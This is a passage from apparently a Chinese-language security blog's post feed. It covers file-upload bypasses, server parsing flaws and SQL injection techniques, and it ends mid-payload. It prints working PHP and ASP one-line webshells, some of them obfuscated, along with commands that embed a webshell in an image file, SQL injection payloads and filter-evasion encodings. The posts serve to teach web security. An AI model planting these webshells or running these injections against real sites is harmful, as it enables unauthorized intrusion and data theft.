align="center">49 49 2A 00</td><td align="center"></td></tr><tr><td align="center">Windows Bitmap(bmp)</td><td align="center">42 4D C0 01</td><td align="center"></td></tr><tr><td align="center">ZIP Archive(zip)</td><td align="center">50 4B 03 04</td><td align="center">00 00 00 00</td></tr><tr><td align="center">RAR Archive(rar)</td><td align="center">52 61 72 21</td><td align="center"></td></tr><tr><td align="center">Adobe Photoshop(psd)</td><td align="center">38 42 50 53</td><td align="center"></td></tr><tr><td align="center">Rich Text Format(rtf)</td><td align="center">7B 5C 72 74 66</td><td align="center"></td></tr><tr><td align="center">XML(xml)</td><td align="center">3C 3F 78 6D 6C</td><td align="center"></td></tr><tr><td align="center">HTML(html)</td><td align="center">68 74 6D 6C 3E</td><td align="center"></td></tr><tr><td align="center">Adobe Acrobat(pdf)</td><td align="center">25 50 44 46 2D 31 2E</td><td align="center"></td></tr><tr><td align="center">Wave(wav)</td><td align="center">57 41 56 45</td><td align="center"></td></tr><tr><td align="center">MIDI(mid)</td><td align="center">4D 54 68 64</td><td align="center"></td></tr><tr><td align="center">AVI(avi)</td><td align="center">41 56 49 20</td><td align="center"></td></tr><tr><td align="center">pcap(pcap)</td><td align="center">4D 3C 2B 1A</td><td align="center"></td></tr><tr><td align="center">CAD(dwg)</td><td align="center">41433130</td><td align="center"></td></tr><tr><td align="center">Email [thorough only] (eml)</td><td align="center">44 65 6C 69 76 65 72 79 2D 64 61 74 65 3A</td><td align="center"></td></tr><tr><td align="center">Outlook Express(dbx)</td><td align="center">CF AD 12 FE C5 FD 74 6F</td><td align="center"></td></tr><tr><td align="center">Outlook(pst)</td><td align="center">21 42 44 4E</td><td align="center"></td></tr><tr><td align="center">MS Word/Excel(xls.or.doc)</td><td align="center">D0 CF 11 E0</td><td align="center"></td></tr><tr><td align="center">MS Access(mdb)</td><td align="center">53 74 61 6E 64 61 72 64 20 4A</td><td align="center"></td></tr><tr><td align="center">WordPerfect(wpd)</td><td align="center">FF 57 50 43</td><td align="center"></td></tr><tr><td align="center">Quicken(qdf)</td><td align="center">AC 9E BD 8F</td><td align="center"></td></tr><tr><td align="center">Windows Password(pwl)</td><td align="center">E3 82 85 96</td><td align="center"></td></tr><tr><td align="center">Real Audio(ram)</td><td align="center">2E 72 61 FD</td><td align="center"></td></tr><tr><td align="center">Real Media(rm)</td><td align="center">2E 52 4D 46</td><td align="center"></td></tr><tr><td align="center">MPEG(mpg)</td><td align="center">00 00 01 BA 或 00 00 01 B3</td><td align="center"></td></tr><tr><td align="center">Quicktime(mov)</td><td align="center">6D 6F 6F 76</td><td align="center"></td></tr><tr><td align="center">Windows Media(asf)</td><td align="center">30 26 B2 75 8E 66 CF 11</td><td align="center"></td></tr></tbody></table><h2 id="基于文件处理的漏洞"><a href="#基于文件处理的漏洞" class="headerlink" title="基于文件处理的漏洞"></a>基于文件处理的漏洞</h2><h3 id="条件竞争"><a href="#条件竞争" class="headerlink" title="条件竞争"></a>条件竞争</h3><p>当网站的文件上传的过程是：<code>服务器获取文件 –&gt; 保存上传临时文件 –&gt; 重命名并移动临时文件</code> 这样的步骤时，就可以使用条件竞争来进行绕过，通过不断地对文件进行上传和打开，从而使服务器还未重命名移动临时文件时，就利用时间差打开了文件，成功执行其中的php代码</p><p>可以利用burp不断发包来进行条件竞争，也可以通过python脚本来反复发送请求得到结果</p><h3 id="二次渲染"><a href="#二次渲染" class="headerlink" title="二次渲染"></a>二次渲染</h3><p>二次渲染会把原本属于图像数据的部分抓出来，再用自己的API 或函数进行重新渲染。在该过程中，非图像数据的部分与图像数据会被隔离开</p><p>绕过方法也很简单，对比原文件和被被二次渲染后的文件，寻找二次渲染并未改变的部分，在其中插入php代码</p><h2 id="基于文件解析的漏洞"><a href="#基于文件解析的漏洞" class="headerlink" title="基于文件解析的漏洞"></a>基于文件解析的漏洞</h2><h3 id="IIS"><a href="#IIS" class="headerlink" title="IIS"></a>IIS</h3><ul><li><p><code>;</code>截断</p><p>当文件名为abc.asp;xx.jpg时，IIS6会将此文件解析成abc.asp，文件名被截断了，从而导致脚本被执行</p></li><li><p>处理文件夹拓展名出错</p><p>在IIS6.0的网站目录中创建有*.asp形式的目录，该文件夹下的所有文件都会以asp脚本格式进行解析</p></li><li><p>WebDav漏洞</p><p>WebDav是一种基于HTTP1.1协议的通信协议。在GET、POST、HEAD等HTTP标准方法之外扩展了新方法。</p><p>攻击者可以通过PUT方法向服务器上传危险脚本</p></li></ul><h3 id="NGINX"><a href="#NGINX" class="headerlink" title="NGINX"></a>NGINX</h3><ul><li><p>php配置错误导致的解析漏洞</p><p>我们用一个test.jpg（其内容为一句话木马）来构造payload：</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/test.jpg/test.php</span><br></pre></td></tr></table></figure><p>  Nginx拿到<code>/test.jpg/test.php</code>后，发现后缀是<code>.php</code>，便认为该文件是php文件，转交给php去处理。php发现<code>/test.jpg/test.php</code>不存在，便删去最后的<code>/test.php</code>，发现<code>/test.jpg</code>存在，便把<code>/test.jpg</code>当成要执行的文件了</p><p>  新版本的php引入了<code>security.limit_extensions</code>，限制了可执行文件的后缀，默认只允许执行<code>.php</code>文件。可以考虑修改该文件中的<code>security.limit_extensions</code>，添加上<code>.jpg</code>，这样php就认为<code>.jpg</code>也是合法的php文件了</p><h3 id="APACHE"><a href="#APACHE" class="headerlink" title="APACHE"></a>APACHE</h3><ul><li><p>多后缀名</p><p>Apache认为一个文件可以有多个后缀，如：example.php.abc，Apache会从右往左辨别后缀，发现不认识<code>.abc</code>，所以读到了<code>.php</code>，就把输入的这个文件当作了php文件</p></li><li><p>换行解析漏洞</p><p>此漏洞的出现是由于apache在修复第一个后缀名解析漏洞时，用正则来匹配后缀。在解析php时<code>xxx.php\x0A</code>将被按照php后缀进行解析，导致绕过一些服务器的安全策略。</p><p>用法是在用burp抓包后在例如<code>1.php</code>后插入以一个<code>\x0A</code>绕过黑名单过滤，访问<code>1.php%0A</code>，即可看到文件被当作php解析。</p></li></ul><h1 id="常见一句话木马"><a href="#常见一句话木马" class="headerlink" title="常见一句话木马"></a>常见一句话木马</h1><h2 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[cmd]) <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);<span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@<span class="variable">$_</span>=<span class="string">&quot;s&quot;</span>.<span class="string">&quot;s&quot;</span>.<span class="comment">/*-/*-*/</span><span class="string">&quot;e&quot;</span>.<span class="comment">/*-/*-*/</span><span class="string">&quot;r&quot;</span>;</span><br><span class="line">@<span class="variable">$_</span>=<span class="comment">/*-/*-*/</span><span class="string">&quot;a&quot;</span>.<span class="comment">/*-/*-*/</span><span class="variable">$_</span>.<span class="comment">/*-/*-*/</span><span class="string">&quot;t&quot;</span>;</span><br><span class="line">@<span class="variable">$_</span><span class="comment">/*-/*-*/</span>($<span class="comment">/*-/*-*/</span>&#123;<span class="string">&quot;_P&quot;</span>.<span class="comment">/*-/*-*/</span><span class="string">&quot;OS&quot;</span>.<span class="comment">/*-/*-*/</span><span class="string">&quot;T&quot;</span>&#125;</span><br><span class="line">[<span class="comment">/*-/*-*/</span><span class="number">0</span><span class="comment">/*-/*-*/</span>-<span class="comment">/*-/*-*/</span><span class="number">2</span><span class="comment">/*-/*-*/</span>-<span class="comment">/*-/*-*/</span><span class="number">5</span><span class="comment">/*-/*-*/</span>])</span><br><span class="line">;<span class="meta">?&gt;</span> <span class="comment"># 密码为 -7</span></span><br></pre></td></tr></table></figure><h2 id="ASP"><a href="#ASP" class="headerlink" title="ASP"></a>ASP</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;%Y=request(&quot;xindong&quot;)%&gt; &lt;%execute(Y)%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%eval (eval(chr(114)+chr(101)+chr(113)+chr(117)+chr(101)+chr(115)+chr(116))(&quot;xindong&quot;))%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%eval&quot;&quot;&amp;(&quot;e&quot;&amp;&quot;v&quot;&amp;&quot;a&quot;&amp;&quot;l&quot;&amp;&quot;(&quot;&amp;&quot;r&quot;&amp;&quot;e&quot;&amp;&quot;q&quot;&amp;&quot;u&quot;&amp;&quot;e&quot;&amp;&quot;s&quot;&amp;&quot;t&quot;&amp;&quot;(&quot;&amp;&quot;0&quot;&amp;&quot;-&quot;&amp;&quot;2&quot;&amp;&quot;-&quot;&amp;&quot;5&quot;&amp;&quot;)&quot;&amp;&quot;)&quot;)%&gt; # 密码是-7</span><br></pre></td></tr></table></figure><h1 id="制作图片马"><a href="#制作图片马" class="headerlink" title="制作图片马"></a>制作图片马</h1><h2 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy image.jpg/b + yjh.php tpm.jpg</span><br></pre></td></tr></table></figure><h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&lt;?php @eval(\$_POST[&#x27;cmd&#x27;]);?&gt;&quot;</span> &gt;&gt; tpm.jpg</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Web-基础知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文件上传 </tag>
            
            <tag> Burp Suite </tag>
            
            <tag> 一句话木马 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入漏洞的利用和绕过</title>
      <link href="/2021/07/28/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E5%92%8C%E7%BB%95%E8%BF%87/"/>
      <url>/2021/07/28/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E5%92%8C%E7%BB%95%E8%BF%87/</url>
      
        <content type="html"><![CDATA[<h1 id="SQL注入的分类"><a href="#SQL注入的分类" class="headerlink" title="SQL注入的分类"></a>SQL注入的分类</h1><h2 id="按变量类型分类"><a href="#按变量类型分类" class="headerlink" title="按变量类型分类"></a>按变量类型分类</h2><ul><li><p>数值型：提交的参数被系统解析为数值</p></li><li><p>字符型：提交的参数被系统解析为字符</p></li></ul><h2 id="按常见注入点分类"><a href="#按常见注入点分类" class="headerlink" title="按常见注入点分类"></a>按常见注入点分类</h2><ul><li>GET/POST/PUT/DELETE 参数</li><li>Cookie</li><li>X-Forwarded-For</li><li>文件名</li></ul><h2 id="按注入利用方式分类"><a href="#按注入利用方式分类" class="headerlink" title="按注入利用方式分类"></a>按注入利用方式分类</h2><ul><li><p>报错注入：应用会显示全部或者部分的报错信息</p></li><li><p>堆叠注入：有的应用可以加入<code>;</code>后一次执行多条语句</p></li><li><p>盲注</p><ul><li>布尔盲注：只能从回显信息中推断语句执行后的布尔值，从而判断构造是否成功</li><li>时间盲注：无任何回显，只能使用特定的时间函数来判断注入是否成功</li></ul></li><li><p>把WAF的缓冲区溢出：超长payload</p></li></ul><h1 id="基本利用流程"><a href="#基本利用流程" class="headerlink" title="基本利用流程"></a>基本利用流程</h1><ol><li><p>初步判断变量类型、注入点以及利用方式</p></li><li><p>判断被过滤关键字和特殊字符，构造绕过</p></li><li><p>查询目标系统的基本信息</p></li><li><p>依次获取库名、表名、列名、数据</p><p>简例如下，以mysql为例（假设回显位为3，共3列）</p></li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,database() #    获取库名</span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() #    获取表名</span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;表名&#x27;</span> #    获取列名</span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,(<span class="keyword">select</span> 列名 <span class="keyword">from</span> <span class="string">&#x27;表名&#x27;</span>) #    获取数据</span><br></pre></td></tr></table></figure><h1 id="基本fuzz方法"><a href="#基本fuzz方法" class="headerlink" title="基本fuzz方法"></a>基本fuzz方法</h1><h2 id="判断闭合符"><a href="#判断闭合符" class="headerlink" title="判断闭合符"></a>判断闭合符</h2><ul><li><code>&#39;</code></li><li><code>&quot;</code></li><li><code>)</code></li></ul><h2 id="判断数据库类型"><a href="#判断数据库类型" class="headerlink" title="判断数据库类型"></a>判断数据库类型</h2><h3 id="通过特有数据表判断"><a href="#通过特有数据表判断" class="headerlink" title="通过特有数据表判断"></a>通过特有数据表判断</h3><ul><li>mssql数据库    </li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> (<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> sysobjects)<span class="operator">&gt;</span><span class="number">0</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span></span><br></pre></td></tr></table></figure><ul><li>access数据库    </li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> (<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> msysobjects)<span class="operator">&gt;</span><span class="number">0</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span></span><br></pre></td></tr></table></figure><ul><li>mysql数据库(5.0+)   </li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> (<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> information_schema.TABLES)<span class="operator">&gt;</span><span class="number">0</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span></span><br></pre></td></tr></table></figure><ul><li>oracle数据库    </li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> (<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> sys.user_tables)<span class="operator">&gt;</span><span class="number">0</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span></span><br></pre></td></tr></table></figure><h3 id="通过特有连接符判断"><a href="#通过特有连接符判断" class="headerlink" title="通过特有连接符判断"></a>通过特有连接符判断</h3><ul><li>mssql数据库    </li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> <span class="string">&#x27;1&#x27;</span> <span class="operator">+</span> <span class="string">&#x27;1&#x27;</span> <span class="operator">=</span> <span class="string">&#x27;11&#x27;</span></span><br></pre></td></tr></table></figure><ul><li>mysql数据库    </li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> <span class="string">&#x27;1&#x27;</span> <span class="operator">+</span> <span class="string">&#x27;1&#x27;</span> <span class="operator">=</span> <span class="string">&#x27;11&#x27;</span></span><br></pre></td></tr></table></figure><ul><li>oracle数据库    </li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> <span class="string">&#x27;1&#x27;</span><span class="operator">||</span><span class="string">&#x27;1&#x27;</span><span class="operator">=</span><span class="string">&#x27;11&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="判断变量类型"><a href="#判断变量类型" class="headerlink" title="判断变量类型"></a>判断变量类型</h2><ul><li>数值型    提交<code>id=3-2</code>回显id为1的页面</li><li>字符型    提交<code>id=3-2</code>出现无回显等情况</li></ul><h2 id="判断关键字和特殊符号的过滤情况"><a href="#判断关键字和特殊符号的过滤情况" class="headerlink" title="判断关键字和特殊符号的过滤情况"></a>判断关键字和特殊符号的过滤情况</h2><ul><li>可使用字典进行测试</li></ul><h1 id="常用测试常量"><a href="#常用测试常量" class="headerlink" title="常用测试常量"></a>常用测试常量</h1><ul><li><code>@@version</code></li><li><code>@@servername</code></li><li><code>@@language</code></li><li><code>@@spid</code></li></ul><h1 id="基本绕过技巧"><a href="#基本绕过技巧" class="headerlink" title="基本绕过技巧"></a>基本绕过技巧</h1><h2 id="使用大小写绕过"><a href="#使用大小写绕过" class="headerlink" title="使用大小写绕过"></a>使用大小写绕过</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">UniOn</span> <span class="keyword">SeleCt</span> xxx</span><br></pre></td></tr></table></figure><h2 id="使用双写绕过"><a href="#使用双写绕过" class="headerlink" title="使用双写绕过"></a>使用双写绕过</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ununionion seselectlect xxx</span><br></pre></td></tr></table></figure><h2 id="使用内联注释绕过"><a href="#使用内联注释绕过" class="headerlink" title="使用内联注释绕过"></a>使用内联注释绕过</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> <span class="comment">/*!select*/</span> xxx # 仅mysql适用</span><br></pre></td></tr></table></figure><h2 id="使用编码绕过"><a href="#使用编码绕过" class="headerlink" title="使用编码绕过"></a>使用编码绕过</h2><ul><li>ascii</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">test </span><br><span class="line">等价于</span><br><span class="line"><span class="type">CHAR</span>(<span class="number">101</span>)<span class="operator">+</span><span class="type">CHAR</span>(<span class="number">97</span>)<span class="operator">+</span><span class="type">CHAR</span>(<span class="number">115</span>)<span class="operator">+</span><span class="type">CHAR</span>(<span class="number">116</span>)</span><br></pre></td></tr></table></figure><ul><li>16进制</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">test</span><br><span class="line">等价于</span><br><span class="line"><span class="number">0x74657374</span></span><br></pre></td></tr></table></figure><ul><li>对关键字进行两次url全编码</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="operator">+</span><span class="keyword">and</span><span class="operator">+</span><span class="number">1</span><span class="operator">=</span><span class="number">2</span></span><br><span class="line">等价于</span><br><span class="line"><span class="number">1</span><span class="operator">+</span><span class="operator">%</span><span class="number">25</span><span class="operator">%</span><span class="number">36</span><span class="operator">%</span><span class="number">31</span><span class="operator">%</span><span class="number">25</span><span class="operator">%</span><span class="number">36</span><span class="operator">%</span><span class="number">65</span><span class="operator">%</span><span class="number">25</span><span class="operator">%</span><span class="number">36</span><span class="operator">%</span><span class="number">34</span><span class="operator">+</span><span class="number">1</span><span class="operator">=</span><span class="number">2</span> </span><br></pre></td></tr></table></figure><ul><li>unicode编码对部分符号的绕过</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">%</span>u0037 <span class="operator">%</span>u02b9 # 单引号</span><br><span class="line"><span class="operator">%</span>u0020 <span class="operator">%</span>uff00 # 空格</span><br><span class="line"><span class="operator">%</span>u0028 <span class="operator">%</span>uff08 # 左括号</span><br><span class="line"><span class="operator">%</span>u0029 <span class="operator">%</span>uff09 # 右括号</span><br></pre></td></tr></table></figure><h2 id="使用-lt-gt-绕过"><a href="#使用-lt-gt-绕过" class="headerlink" title="使用&lt;&gt;绕过"></a>使用&lt;&gt;绕过</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unio<span class="operator">&lt;&gt;</span>n sel<span class="operator">&lt;&gt;</span>ect</span><br></pre></td></tr></table></figure><h2 id="使用注释符绕过"><a href="#使用注释符绕过" class="headerlink" title="使用注释符绕过"></a>使用注释符绕过</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uni<span class="comment">/**/</span><span class="keyword">on</span> se<span class="comment">/**/</span>lect</span><br></pre></td></tr></table></figure><h2 id="使用反引号绕过"><a href="#使用反引号绕过" class="headerlink" title="使用反引号绕过"></a>使用反引号绕过</h2><p>反引号：它是为了区分MYSQL的保留字与普通字符而引入的符号，例如下列两句等价</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">information_schema.tables</span><br><span class="line">information_schema.`tables`</span><br></pre></td></tr></table></figure><h2 id="过滤空格的绕过"><a href="#过滤空格的绕过" class="headerlink" title="过滤空格的绕过"></a>过滤空格的绕过</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**/</span></span><br><span class="line"><span class="operator">%</span><span class="number">20</span> </span><br><span class="line"><span class="operator">%</span><span class="number">0</span>a</span><br><span class="line"><span class="operator">%</span><span class="number">09</span> # 水平tab</span><br><span class="line"><span class="operator">%</span><span class="number">0</span>b # 垂直tab</span><br><span class="line"><span class="operator">%</span><span class="number">0</span>c # 新建页</span><br><span class="line"><span class="operator">%</span><span class="number">00</span></span><br><span class="line"><span class="operator">%</span><span class="number">0</span>d # 回车符</span><br><span class="line">()</span><br><span class="line"><span class="operator">%</span><span class="number">0</span>a # 新建行</span><br><span class="line">`</span><br></pre></td></tr></table></figure><h2 id="过滤or的绕过"><a href="#过滤or的绕过" class="headerlink" title="过滤or的绕过"></a>过滤or的绕过</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">or</span> <span class="operator">=</span> <span class="operator">||</span></span><br></pre></td></tr></table></figure><h2 id="过滤and的绕过"><a href="#过滤and的绕过" class="headerlink" title="过滤and的绕过"></a>过滤and的绕过</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> <span class="operator">=</span> <span class="operator">&amp;&amp;</span></span><br></pre></td></tr></table></figure><h2 id="过滤等号-的绕过"><a href="#过滤等号-的绕过" class="headerlink" title="过滤等号=的绕过"></a>过滤等号=的绕过</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">or</span> <span class="number">1</span> <span class="keyword">like</span> <span class="number">1</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">or</span> <span class="number">1</span> rlike <span class="number">1</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">or</span> <span class="number">1</span> regexp <span class="number">1</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">or</span> <span class="operator">!</span>(<span class="number">1</span> <span class="operator">&lt;&gt;</span> <span class="number">1</span>)</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">or</span> <span class="number">1</span> <span class="operator">!</span>(<span class="operator">&lt;&gt;</span>) <span class="number">1</span></span><br></pre></td></tr></table></figure><h2 id="过滤单引号的绕过"><a href="#过滤单引号的绕过" class="headerlink" title="过滤单引号的绕过"></a>过滤单引号的绕过</h2><ul><li>宽字符</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">%</span>bf<span class="operator">%</span><span class="number">27</span>  </span><br><span class="line"><span class="operator">%</span>df<span class="operator">%</span><span class="number">27</span>  </span><br><span class="line"><span class="operator">%</span>aa<span class="operator">%</span><span class="number">27</span></span><br></pre></td></tr></table></figure><ul><li>十六进制</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;users&#x27;</span></span><br><span class="line">等价于</span><br><span class="line"><span class="number">0x7573657273</span></span><br></pre></td></tr></table></figure><h2 id="过滤逗号的绕过"><a href="#过滤逗号的绕过" class="headerlink" title="过滤逗号的绕过"></a>过滤逗号的绕过</h2><ul><li>使用<code>from x to x</code></li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> substr(&quot;string&quot;,<span class="number">1</span>,<span class="number">1</span>);</span><br><span class="line">等价于</span><br><span class="line"><span class="keyword">select</span> substr(&quot;string&quot; <span class="keyword">from</span> <span class="number">1</span> <span class="keyword">for</span> <span class="number">1</span>);</span><br></pre></td></tr></table></figure><ul><li>使用<code>join</code></li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span></span><br><span class="line">等价于</span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>)a <span class="keyword">join</span> (<span class="keyword">select</span> <span class="number">2</span>)b <span class="keyword">join</span>(<span class="keyword">select</span> <span class="number">3</span>)c</span><br></pre></td></tr></table></figure><ul><li>使用<code>offset</code></li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">limit <span class="number">2</span>,<span class="number">1</span></span><br><span class="line">等价于</span><br><span class="line">limit <span class="number">1</span> <span class="keyword">offset</span> <span class="number">2</span></span><br></pre></td></tr></table></figure><h2 id="过滤函数绕过"><a href="#过滤函数绕过" class="headerlink" title="过滤函数绕过"></a>过滤函数绕过</h2><ul><li><code>substring</code> / <code>mid</code> / <code>sub</code></li><li><code>ascii</code> / <code>hex</code> / <code>bin</code></li><li><code>benchmark</code> / <code>sleep</code></li></ul><h2 id="过滤select绕过"><a href="#过滤select绕过" class="headerlink" title="过滤select绕过"></a>过滤select绕过</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sel<span class="operator">&lt;&gt;</span>ect</span><br><span class="line">sele<span class="comment">/**/</span>ct</span><br><span class="line"><span class="comment">/*!%53eLEct*/</span></span><br><span class="line">se<span class="operator">%</span><span class="number">0</span>blect</span><br><span class="line">REVERSE(tceles)</span><br><span class="line"><span class="operator">%</span><span class="number">53</span>eLEct</span><br></pre></td></tr></table></figure><h2 id="若过滤了union和select等关键字应考虑盲注"><a href="#若过滤了union和select等关键字应考虑盲注" class="headerlink" title="若过滤了union和select等关键字应考虑盲注"></a>若过滤了union和select等关键字应考虑盲注</h2><h1 id="针对不同利用方式注入的应对方法"><a href="#针对不同利用方式注入的应对方法" class="headerlink" title="针对不同利用方式注入的应对方法"></a>针对不同利用方式注入的应对方法</h1><h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><h3 id="利用方式举例"><a href="#利用方式举例" class="headerlink" title="利用方式举例"></a>利用方式举例</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> <span class="number">1</span><span 